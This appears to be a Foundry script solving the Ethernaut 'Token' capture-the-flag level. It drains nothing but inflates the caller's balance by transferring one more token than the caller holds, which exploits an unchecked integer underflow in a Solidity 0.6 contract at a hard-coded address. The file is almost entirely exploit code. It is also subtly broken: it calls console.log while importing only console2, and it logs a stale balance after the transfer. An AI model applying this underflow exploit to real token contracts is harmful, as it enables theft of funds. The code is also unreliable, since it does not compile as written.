// SPDX-License-Identifier: MIT

pragma solidity ^0.6.0;

import {Script} from "forge-std/Script.sol";
import {console2} from "forge-std/console2.sol";
import {Token} from "../src/EthernautToken.sol";

contract TokenSolution is Script {
    Token token = Token(0xcfC3918Ade7638FEfe5694EEf36f17e6eF5a1789);
    UnderflowAttack underflowAttack;
    uint256 myBalance = token.balanceOf(vm.envAddress("MY_ADDRESS"));

    function run() external {
        console.log("Total supply of Token: ", token.totalSupply());
        console.log("My account balance: ", myBalance);
        underflowAttack = new UnderflowAttack();
        // Call transfer
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        token.transfer(address(underflowAttack), myBalance + 1);
        console.log("My account balance after transfer: ", myBalance);
    }
}

contract UnderflowAttack {}
